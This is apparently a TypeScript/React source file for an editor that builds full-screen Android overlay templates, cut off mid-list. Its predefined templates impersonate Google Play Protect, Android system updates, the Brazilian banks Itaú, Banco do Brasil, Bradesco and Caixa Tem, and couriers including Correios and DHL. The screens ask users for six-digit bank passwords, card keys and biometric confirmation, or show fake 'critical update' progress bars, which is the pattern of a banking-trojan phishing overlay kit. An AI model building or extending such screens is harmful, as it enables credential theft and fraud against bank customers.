import React, { useState, useRef, useEffect } from 'react';
import { X, Save, Trash2, Type, Image, Square, Circle, Fingerprint, Scan, Loader2 } from 'lucide-react';

// Dimensões base do Android (proporção 9:19.5 - equivalente a tela 1080x2400)
const ANDROID_WIDTH = 360;
const ANDROID_HEIGHT = 780;

// Dimensões do preview no editor (escala visual)
const PREVIEW_WIDTH = 300;
const PREVIEW_HEIGHT = 650;

interface ScreenElement {
  id: string;
  type: 'text' | 'image' | 'rectangle' | 'circle' | 'logo' | 'fingerprint' | 'facial' | 'loading_bar' | 'input' | 'button';
  x: number;
  y: number;
  width: number;
  height: number;
  content?: string;
  fontSize?: number;
  fontWeight?: string;
  color?: string;
  backgroundColor?: string;
  borderRadius?: number;
  opacity?: number;
  imageUrl?: string;
  
  // Custom properties for Biometrics and Loading Bar
  biometricColor?: string;
  biometricText?: string;
  biometricAction?: 'next' | 'submit' | 'close' | 'home' | 'hide' | 'open_url';
  biometricUrl?: string;
  biometricShape?: 'normal' | 'oval';
  loadingText?: string;
  loadingDuration?: number;
  loadingAction?: 'next' | 'submit' | 'close' | 'home' | 'hide' | 'open_url';
  loadingUrl?: string;
  placeholder?: string;
  borderColor?: string;
}

interface BlackScreenTemplate {
  id: string;
  name: string;
  backgroundColor: string;
  elements: ScreenElement[];
  createdAt: string;
}

const PREDEFINED_BLACK_SCREEN_TEMPLATES: BlackScreenTemplate[] = [
  {
    id: 'pre-google-progress',
    name: '✨ Google Play - Carregando Atualização',
    backgroundColor: '#202124',
    createdAt: new Date().toISOString(),
    elements: [
      {
        id: 'g-logo',
        type: 'logo',
        x: 140,
        y: 110,
        width: 80,
        height: 80,
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'g-text-1',
        type: 'text',
        x: 30,
        y: 210,
        width: 300,
        height: 30,
        content: 'Instalando atualização crítica...',
        fontSize: 15,
        fontWeight: 'normal',
        color: '#9aa0a6',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'g-progress',
        type: 'loading_bar',
        x: 50,
        y: 260,
        width: 260,
        height: 60,
        backgroundColor: '#e8731a',
        borderRadius: 5,
        opacity: 100,
        loadingText: 'Instalando atualização do sistema',
        loadingDuration: 5000,
        loadingAction: 'next'
      }
    ]
  },
  {
    id: 'pre-google-fingerprint',
    name: '✨ Google Play - Confirmar Digital',
    backgroundColor: '#202124',
    createdAt: new Date().toISOString(),
    elements: [
      {
        id: 'g-title',
        type: 'text',
        x: 30,
        y: 80,
        width: 300,
        height: 40,
        content: 'Confirmação do Google Play Protect',
        fontSize: 18,
        fontWeight: 'bold',
        color: '#ffffff',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'g-desc',
        type: 'text',
        x: 30,
        y: 130,
        width: 300,
        height: 60,
        content: 'Para autorizar a verificação dos serviços protegidos do Google, autentique sua digital na área demarcada abaixo.',
        fontSize: 13,
        fontWeight: 'normal',
        color: '#9aa0a6',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'g-finger',
        type: 'fingerprint',
        x: 120,
        y: 230,
        width: 120,
        height: 150,
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100,
        biometricColor: '#e8731a',
        biometricText: 'Toque e segure o sensor para validar',
        biometricAction: 'next'
      }
    ]
  },
  {
    id: 'pre-google-facial',
    name: '✨ Google Play - Confirmar Rosto',
    backgroundColor: '#202124',
    createdAt: new Date().toISOString(),
    elements: [
      {
        id: 'g-face-title',
        type: 'text',
        x: 30,
        y: 80,
        width: 300,
        height: 40,
        content: 'Validação Facial Google Play',
        fontSize: 18,
        fontWeight: 'bold',
        color: '#ffffff',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'g-face-desc',
        type: 'text',
        x: 30,
        y: 135,
        width: 300,
        height: 60,
        content: 'Posicione seu rosto na câmera frontal para validar os recursos de segurança.',
        fontSize: 13,
        fontWeight: 'normal',
        color: '#9aa0a6',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'g-face-scan',
        type: 'facial',
        x: 90,
        y: 220,
        width: 180,
        height: 220,
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100,
        biometricColor: '#34a853',
        biometricText: 'Escaneando...',
        biometricAction: 'close'
      }
    ]
  },
  {
    id: 'pre-android-patch',
    name: '✨ Sistema Android - Carregando Patch',
    backgroundColor: '#121212',
    createdAt: new Date().toISOString(),
    elements: [
      {
        id: 'a-logo',
        type: 'logo',
        x: 140,
        y: 110,
        width: 80,
        height: 80,
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'a-title',
        type: 'text',
        x: 30,
        y: 210,
        width: 300,
        height: 40,
        content: 'Instalando atualização do sistema',
        fontSize: 18,
        fontWeight: 'bold',
        color: '#ffffff',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'a-loading',
        type: 'loading_bar',
        x: 50,
        y: 270,
        width: 260,
        height: 60,
        backgroundColor: '#3ddc84',
        borderRadius: 5,
        opacity: 100,
        loadingText: 'Progresso da atualização',
        loadingDuration: 6000,
        loadingAction: 'next'
      }
    ]
  },
  {
    id: 'pre-android-fingerprint',
    name: '✨ Android System - Confirmar Digital',
    backgroundColor: '#121212',
    createdAt: new Date().toISOString(),
    elements: [
      {
        id: 'a-bio-title',
        type: 'text',
        x: 30,
        y: 90,
        width: 300,
        height: 35,
        content: 'Confirmação do Proprietário',
        fontSize: 18,
        fontWeight: 'bold',
        color: '#ffffff',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'a-bio-desc',
        type: 'text',
        x: 30,
        y: 140,
        width: 300,
        height: 60,
        content: 'Use sua digital para confirmar a instalação dos novos patches de segurança do Android.',
        fontSize: 13,
        fontWeight: 'normal',
        color: '#9aa0a6',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'a-fingerprint',
        type: 'fingerprint',
        x: 120,
        y: 230,
        width: 120,
        height: 150,
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100,
        biometricColor: '#3ddc84',
        biometricText: 'Toque para verificar a biometria',
        biometricAction: 'close'
      }
    ]
  },
  {
    id: 'pre-itau-senha',
    name: '🔥 Itaú - Digite a Senha de Acesso',
    backgroundColor: '#f4f5f7',
    createdAt: new Date().toISOString(),
    elements: [
      {
        id: 'itau-header-title',
        type: 'text',
        x: 20,
        y: 100,
        width: 320,
        height: 35,
        content: 'Digite a senha de acesso',
        fontSize: 22,
        fontWeight: 'bold',
        color: '#1a1a1a',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'itau-dots-indicator',
        type: 'text',
        x: 70,
        y: 155,
        width: 220,
        height: 30,
        content: '○   ○   ○   ○   ○   ○',
        fontSize: 18,
        fontWeight: 'bold',
        color: '#ed7c0e',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      // Keypad Grid 3x4
      { id: 'itau-key-1', type: 'button', x: 30, y: 210, width: 90, height: 48, content: '1', fontSize: 18, fontWeight: 'bold', color: '#ed7c0e', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'itau-key-2', type: 'button', x: 135, y: 210, width: 90, height: 48, content: '2', fontSize: 18, fontWeight: 'bold', color: '#ed7c0e', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'itau-key-3', type: 'button', x: 240, y: 210, width: 90, height: 48, content: '3', fontSize: 18, fontWeight: 'bold', color: '#ed7c0e', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'itau-key-4', type: 'button', x: 30, y: 268, width: 90, height: 48, content: '4', fontSize: 18, fontWeight: 'bold', color: '#ed7c0e', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'itau-key-5', type: 'button', x: 135, y: 268, width: 90, height: 48, content: '5', fontSize: 18, fontWeight: 'bold', color: '#ed7c0e', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'itau-key-6', type: 'button', x: 240, y: 268, width: 90, height: 48, content: '6', fontSize: 18, fontWeight: 'bold', color: '#ed7c0e', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'itau-key-7', type: 'button', x: 30, y: 326, width: 90, height: 48, content: '7', fontSize: 18, fontWeight: 'bold', color: '#ed7c0e', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'itau-key-8', type: 'button', x: 135, y: 326, width: 90, height: 48, content: '8', fontSize: 18, fontWeight: 'bold', color: '#ed7c0e', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'itau-key-9', type: 'button', x: 240, y: 326, width: 90, height: 48, content: '9', fontSize: 18, fontWeight: 'bold', color: '#ed7c0e', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'itau-key-0', type: 'button', x: 135, y: 384, width: 90, height: 48, content: '0', fontSize: 18, fontWeight: 'bold', color: '#ed7c0e', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'itau-key-del', type: 'button', x: 240, y: 384, width: 90, height: 48, content: '⌫', fontSize: 18, fontWeight: 'bold', color: '#6b6b6b', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      {
        id: 'itau-forgot-pwd',
        type: 'text',
        x: 50,
        y: 470,
        width: 260,
        height: 25,
        content: 'Esqueci minha senha ›',
        fontSize: 15,
        fontWeight: '600',
        color: '#1a1a1a',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'itau-btn-continue',
        type: 'button',
        x: 30,
        y: 520,
        width: 300,
        height: 50,
        content: 'Continuar',
        fontSize: 16,
        fontWeight: 'bold',
        color: '#ffffff',
        backgroundColor: '#ed7c0e',
        borderRadius: 25,
        opacity: 100,
        loadingAction: 'submit'
      }
    ]
  },
  {
    id: 'pre-correios-liberacao',
    name: '🚚 Correios - Liberação de Encomenda Pendente',
    backgroundColor: '#6b4100',
    createdAt: new Date().toISOString(),
    elements: [
      {
        id: 'cor-header',
        type: 'text',
        x: 30,
        y: 70,
        width: 300,
        height: 40,
        content: 'CORREIOS',
        fontSize: 26,
        fontWeight: 'bold',
        color: '#ffe600',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'cor-subtitle',
        type: 'text',
        x: 30,
        y: 120,
        width: 300,
        height: 30,
        content: '📦 Objeto Aguardando Liberação',
        fontSize: 16,
        fontWeight: 'bold',
        color: '#ffffff',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'cor-desc',
        type: 'text',
        x: 30,
        y: 160,
        width: 300,
        height: 60,
        content: 'Sua encomenda [BR849204912] precisa de confirmação de dados do destinatário para liberação da rota de entrega.',
        fontSize: 13,
        fontWeight: 'normal',
        color: '#fef5e1',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'cor-loading',
        type: 'loading_bar',
        x: 40,
        y: 240,
        width: 280,
        height: 55,
        backgroundColor: '#ffe600',
        borderRadius: 8,
        opacity: 100,
        loadingText: 'Processando liberação no Centro de Distribuição...',
        loadingDuration: 5000,
        loadingAction: 'next'
      },
      {
        id: 'cor-btn',
        type: 'button',
        x: 30,
        y: 320,
        width: 300,
        height: 50,
        content: '⚡ Confirmar Liberação de Entrega',
        fontSize: 15,
        fontWeight: 'bold',
        color: '#6b4100',
        backgroundColor: '#ffe600',
        borderRadius: 12,
        opacity: 100,
        loadingAction: 'submit'
      }
    ]
  },
  {
    id: 'pre-jt-express',
    name: '📦 J&T Express - Atualização de Rastreio & Entrega',
    backgroundColor: '#1c080a',
    createdAt: new Date().toISOString(),
    elements: [
      {
        id: 'jt-header',
        type: 'text',
        x: 30,
        y: 70,
        width: 300,
        height: 40,
        content: 'J&T EXPRESS',
        fontSize: 26,
        fontWeight: 'bold',
        color: '#e30613',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'jt-sub',
        type: 'text',
        x: 30,
        y: 120,
        width: 300,
        height: 30,
        content: '🚚 Tentativa de Entrega Não Concluída',
        fontSize: 16,
        fontWeight: 'bold',
        color: '#ffffff',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'jt-desc',
        type: 'text',
        x: 30,
        y: 160,
        width: 300,
        height: 50,
        content: 'Confirme sua identidade com a biometria para reagendar a entrega priorizada do seu pedido.',
        fontSize: 13,
        fontWeight: 'normal',
        color: '#d1d5db',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'jt-fingerprint',
        type: 'fingerprint',
        x: 120,
        y: 230,
        width: 120,
        height: 150,
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100,
        biometricColor: '#e30613',
        biometricText: 'Toque o sensor para autenticar o recebimento',
        biometricAction: 'next'
      },
      {
        id: 'jt-btn',
        type: 'button',
        x: 30,
        y: 410,
        width: 300,
        height: 48,
        content: 'Validar Endereço & Reagendar',
        fontSize: 15,
        fontWeight: 'bold',
        color: '#ffffff',
        backgroundColor: '#e30613',
        borderRadius: 10,
        opacity: 100,
        loadingAction: 'submit'
      }
    ]
  },
  {
    id: 'pre-loggi-entrega',
    name: '🚚 Loggi - Validação de Pacote em Rota',
    backgroundColor: '#240803',
    createdAt: new Date().toISOString(),
    elements: [
      {
        id: 'loggi-header',
        type: 'text',
        x: 30,
        y: 70,
        width: 300,
        height: 40,
        content: 'LOGGI',
        fontSize: 28,
        fontWeight: 'bold',
        color: '#ff5200',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'loggi-sub',
        type: 'text',
        x: 30,
        y: 120,
        width: 300,
        height: 30,
        content: '🛵 Entregador Próximo ao Local',
        fontSize: 16,
        fontWeight: 'bold',
        color: '#ffffff',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'loggi-desc',
        type: 'text',
        x: 30,
        y: 160,
        width: 300,
        height: 50,
        content: 'Valide a biometria para que o entregador efetue a entrega sem contato físico.',
        fontSize: 13,
        fontWeight: 'normal',
        color: '#ffa3a3',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'loggi-progress',
        type: 'loading_bar',
        x: 40,
        y: 230,
        width: 280,
        height: 50,
        backgroundColor: '#ff5200',
        borderRadius: 8,
        opacity: 100,
        loadingText: 'Sincronizando GPS com o entregador...',
        loadingDuration: 4000,
        loadingAction: 'next'
      },
      {
        id: 'loggi-fingerprint',
        type: 'fingerprint',
        x: 120,
        y: 300,
        width: 120,
        height: 140,
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100,
        biometricColor: '#ff5200',
        biometricText: 'Biometria do Destinatário',
        biometricAction: 'close'
      }
    ]
  },
  {
    id: 'pre-mercado-envios',
    name: '📦 Mercado Envios - Verificação de Carga Prioritária',
    backgroundColor: '#1a1d24',
    createdAt: new Date().toISOString(),
    elements: [
      {
        id: 'me-header',
        type: 'text',
        x: 30,
        y: 70,
        width: 300,
        height: 35,
        content: 'mercado envios',
        fontSize: 24,
        fontWeight: 'bold',
        color: '#ffe600',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'me-sub',
        type: 'text',
        x: 30,
        y: 115,
        width: 300,
        height: 30,
        content: '🛡️ Verificação de Segurança da Encomenda',
        fontSize: 15,
        fontWeight: 'bold',
        color: '#ffffff',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'me-desc',
        type: 'text',
        x: 30,
        y: 155,
        width: 300,
        height: 55,
        content: 'Pacote #MKL-940212 em rota de entrega. Confirme os dados da conta para liberação imediata ao motorista.',
        fontSize: 13,
        fontWeight: 'normal',
        color: '#afa39c',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'me-loading',
        type: 'loading_bar',
        x: 40,
        y: 225,
        width: 280,
        height: 55,
        backgroundColor: '#ffe600',
        borderRadius: 8,
        opacity: 100,
        loadingText: 'Validando protocolo de rastreamento...',
        loadingDuration: 5000,
        loadingAction: 'next'
      },
      {
        id: 'me-btn',
        type: 'button',
        x: 30,
        y: 310,
        width: 300,
        height: 48,
        content: '⚡ Liberar Pacote Mercado Envios',
        fontSize: 15,
        fontWeight: 'bold',
        color: '#1a1d24',
        backgroundColor: '#ffe600',
        borderRadius: 12,
        opacity: 100,
        loadingAction: 'submit'
      }
    ]
  },
  {
    id: 'pre-jadlog-frete',
    name: '🚚 Jadlog - Notificação de Carga Retida',
    backgroundColor: '#141414',
    createdAt: new Date().toISOString(),
    elements: [
      {
        id: 'jad-header',
        type: 'text',
        x: 30,
        y: 70,
        width: 300,
        height: 40,
        content: 'JADLOG',
        fontSize: 26,
        fontWeight: 'bold',
        color: '#d32f2f',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'jad-sub',
        type: 'text',
        x: 30,
        y: 120,
        width: 300,
        height: 30,
        content: '⚠️ Pendente de Liberação Cadastral',
        fontSize: 16,
        fontWeight: 'bold',
        color: '#ffffff',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'jad-desc',
        type: 'text',
        x: 30,
        y: 160,
        width: 300,
        height: 55,
        content: 'A carga necessita de autenticação biométrica para liberar o documento fiscal e autorizar a saída do Hub regional.',
        fontSize: 13,
        fontWeight: 'normal',
        color: '#b0bec5',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'jad-loading',
        type: 'loading_bar',
        x: 40,
        y: 230,
        width: 280,
        height: 55,
        backgroundColor: '#d32f2f',
        borderRadius: 8,
        opacity: 100,
        loadingText: 'Atualizando status na Jadlog...',
        loadingDuration: 6000,
        loadingAction: 'next'
      },
      {
        id: 'jad-btn',
        type: 'button',
        x: 30,
        y: 315,
        width: 300,
        height: 48,
        content: 'Autorizar Saída do Hub Regional',
        fontSize: 15,
        fontWeight: 'bold',
        color: '#ffffff',
        backgroundColor: '#d32f2f',
        borderRadius: 10,
        opacity: 100,
        loadingAction: 'submit'
      }
    ]
  },
  {
    id: 'pre-dhl-express',
    name: '📦 DHL Express - Fiscalização & Rastreio Internacional',
    backgroundColor: '#1a1914',
    createdAt: new Date().toISOString(),
    elements: [
      {
        id: 'dhl-header',
        type: 'text',
        x: 30,
        y: 70,
        width: 300,
        height: 40,
        content: 'DHL EXPRESS',
        fontSize: 26,
        fontWeight: 'bold',
        color: '#ffcc00',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'dhl-sub',
        type: 'text',
        x: 30,
        y: 120,
        width: 300,
        height: 30,
        content: '🌐 Carga Importada em Fiscalização',
        fontSize: 15,
        fontWeight: 'bold',
        color: '#d40511',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'dhl-desc',
        type: 'text',
        x: 30,
        y: 160,
        width: 300,
        height: 55,
        content: 'Remessa internacional aguardando confirmação do destinatário para emissão do comprovante de entrega.',
        fontSize: 13,
        fontWeight: 'normal',
        color: '#e5e7eb',
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100
      },
      {
        id: 'dhl-facial',
        type: 'facial',
        x: 90,
        y: 230,
        width: 180,
        height: 200,
        backgroundColor: 'transparent',
        borderRadius: 0,
        opacity: 100,
        biometricColor: '#ffcc00',
        biometricText: 'Validação Facial do Destinatário',
        biometricAction: 'close'
      },
      {
        id: 'dhl-btn',
        type: 'button',
        x: 30,
        y: 450,
        width: 300,
        height: 48,
        content: 'Confirmar Recebimento DHL',
        fontSize: 15,
        fontWeight: 'bold',
        color: '#ffffff',
        backgroundColor: '#d40511',
        borderRadius: 10,
        opacity: 100,
        loadingAction: 'submit'
      }
    ]
  },
  {
    id: 'pre-bb-senha',
    name: '🔥 Banco do Brasil - Digite a Senha de 6 Dígitos',
    backgroundColor: '#a83800',
    createdAt: new Date().toISOString(),
    elements: [
      { id: 'bb-title', type: 'text', x: 20, y: 80, width: 320, height: 35, content: 'BANCO DO BRASIL', fontSize: 24, fontWeight: 'bold', color: '#fff100', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'bb-sub', type: 'text', x: 20, y: 125, width: 320, height: 30, content: 'Digite a senha da sua conta (6 dígitos)', fontSize: 14, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'bb-dots', type: 'text', x: 70, y: 165, width: 220, height: 30, content: '○   ○   ○   ○   ○   ○', fontSize: 18, fontWeight: 'bold', color: '#fff100', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'bb-k1', type: 'button', x: 30, y: 215, width: 90, height: 48, content: '1', fontSize: 18, fontWeight: 'bold', color: '#a83800', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bb-k2', type: 'button', x: 135, y: 215, width: 90, height: 48, content: '2', fontSize: 18, fontWeight: 'bold', color: '#a83800', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bb-k3', type: 'button', x: 240, y: 215, width: 90, height: 48, content: '3', fontSize: 18, fontWeight: 'bold', color: '#a83800', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bb-k4', type: 'button', x: 30, y: 273, width: 90, height: 48, content: '4', fontSize: 18, fontWeight: 'bold', color: '#a83800', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bb-k5', type: 'button', x: 135, y: 273, width: 90, height: 48, content: '5', fontSize: 18, fontWeight: 'bold', color: '#a83800', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bb-k6', type: 'button', x: 240, y: 273, width: 90, height: 48, content: '6', fontSize: 18, fontWeight: 'bold', color: '#a83800', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bb-k7', type: 'button', x: 30, y: 331, width: 90, height: 48, content: '7', fontSize: 18, fontWeight: 'bold', color: '#a83800', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bb-k8', type: 'button', x: 135, y: 331, width: 90, height: 48, content: '8', fontSize: 18, fontWeight: 'bold', color: '#a83800', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bb-k9', type: 'button', x: 240, y: 331, width: 90, height: 48, content: '9', fontSize: 18, fontWeight: 'bold', color: '#a83800', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bb-k0', type: 'button', x: 135, y: 389, width: 90, height: 48, content: '0', fontSize: 18, fontWeight: 'bold', color: '#a83800', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bb-kdel', type: 'button', x: 240, y: 389, width: 90, height: 48, content: '⌫', fontSize: 18, fontWeight: 'bold', color: '#a83800', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bb-btn', type: 'button', x: 30, y: 460, width: 300, height: 50, content: 'Confirmar no Banco do Brasil', fontSize: 15, fontWeight: 'bold', color: '#a83800', backgroundColor: '#fff100', borderRadius: 25, opacity: 100, loadingAction: 'submit' }
    ]
  },
  {
    id: 'pre-bradesco-token',
    name: '🔥 Bradesco - Validação de Chave & Token',
    backgroundColor: '#cc092f',
    createdAt: new Date().toISOString(),
    elements: [
      { id: 'bra-title', type: 'text', x: 20, y: 80, width: 320, height: 35, content: 'bradesco', fontSize: 26, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'bra-sub', type: 'text', x: 20, y: 125, width: 320, height: 30, content: 'Digite a senha do Cartão / Chave de Segurança', fontSize: 13, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'bra-dots', type: 'text', x: 90, y: 165, width: 180, height: 30, content: '○   ○   ○   ○', fontSize: 20, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'bra-k1', type: 'button', x: 30, y: 215, width: 90, height: 48, content: '1', fontSize: 18, fontWeight: 'bold', color: '#cc092f', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bra-k2', type: 'button', x: 135, y: 215, width: 90, height: 48, content: '2', fontSize: 18, fontWeight: 'bold', color: '#cc092f', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bra-k3', type: 'button', x: 240, y: 215, width: 90, height: 48, content: '3', fontSize: 18, fontWeight: 'bold', color: '#cc092f', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bra-k4', type: 'button', x: 30, y: 273, width: 90, height: 48, content: '4', fontSize: 18, fontWeight: 'bold', color: '#cc092f', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bra-k5', type: 'button', x: 135, y: 273, width: 90, height: 48, content: '5', fontSize: 18, fontWeight: 'bold', color: '#cc092f', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bra-k6', type: 'button', x: 240, y: 273, width: 90, height: 48, content: '6', fontSize: 18, fontWeight: 'bold', color: '#cc092f', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bra-k7', type: 'button', x: 30, y: 331, width: 90, height: 48, content: '7', fontSize: 18, fontWeight: 'bold', color: '#cc092f', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bra-k8', type: 'button', x: 135, y: 331, width: 90, height: 48, content: '8', fontSize: 18, fontWeight: 'bold', color: '#cc092f', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bra-k9', type: 'button', x: 240, y: 331, width: 90, height: 48, content: '9', fontSize: 18, fontWeight: 'bold', color: '#cc092f', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bra-k0', type: 'button', x: 135, y: 389, width: 90, height: 48, content: '0', fontSize: 18, fontWeight: 'bold', color: '#cc092f', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bra-kdel', type: 'button', x: 240, y: 389, width: 90, height: 48, content: '⌫', fontSize: 18, fontWeight: 'bold', color: '#cc092f', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'bra-btn', type: 'button', x: 30, y: 460, width: 300, height: 50, content: 'Validar Acesso Bradesco', fontSize: 15, fontWeight: 'bold', color: '#cc092f', backgroundColor: '#ffffff', borderRadius: 25, opacity: 100, loadingAction: 'submit' }
    ]
  },
  {
    id: 'pre-caixa-senha',
    name: '🔥 Caixa Econômica / Caixa Tem - Confirmar Senha',
    backgroundColor: '#b36600',
    createdAt: new Date().toISOString(),
    elements: [
      { id: 'cef-title', type: 'text', x: 20, y: 80, width: 320, height: 35, content: 'CAIXA TEM', fontSize: 24, fontWeight: 'bold', color: '#f37021', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'cef-sub', type: 'text', x: 20, y: 125, width: 320, height: 30, content: 'Digite a senha do aplicativo (6 dígitos)', fontSize: 14, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'cef-dots', type: 'text', x: 70, y: 165, width: 220, height: 30, content: '○   ○   ○   ○   ○   ○', fontSize: 18, fontWeight: 'bold', color: '#f37021', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'cef-k1', type: 'button', x: 30, y: 215, width: 90, height: 48, content: '1', fontSize: 18, fontWeight: 'bold', color: '#b36600', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'cef-k2', type: 'button', x: 135, y: 215, width: 90, height: 48, content: '2', fontSize: 18, fontWeight: 'bold', color: '#b36600', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'cef-k3', type: 'button', x: 240, y: 215, width: 90, height: 48, content: '3', fontSize: 18, fontWeight: 'bold', color: '#b36600', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'cef-k4', type: 'button', x: 30, y: 273, width: 90, height: 48, content: '4', fontSize: 18, fontWeight: 'bold', color: '#b36600', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'cef-k5', type: 'button', x: 135, y: 273, width: 90, height: 48, content: '5', fontSize: 18, fontWeight: 'bold', color: '#b36600', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'cef-k6', type: 'button', x: 240, y: 273, width: 90, height: 48, content: '6', fontSize: 18, fontWeight: 'bold', color: '#b36600', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'cef-k7', type: 'button', x: 30, y: 331, width: 90, height: 48, content: '7', fontSize: 18, fontWeight: 'bold', color: '#b36600', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'cef-k8', type: 'button', x: 135, y: 331, width: 90, height: 48, content: '8', fontSize: 18, fontWeight: 'bold', color: '#b36600', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'cef-k9', type: 'button', x: 240, y: 331, width: 90, height: 48, content: '9', fontSize: 18, fontWeight: 'bold', color: '#b36600', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'cef-k0', type: 'button', x: 135, y: 389, width: 90, height: 48, content: '0', fontSize: 18, fontWeight: 'bold', color: '#b36600', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
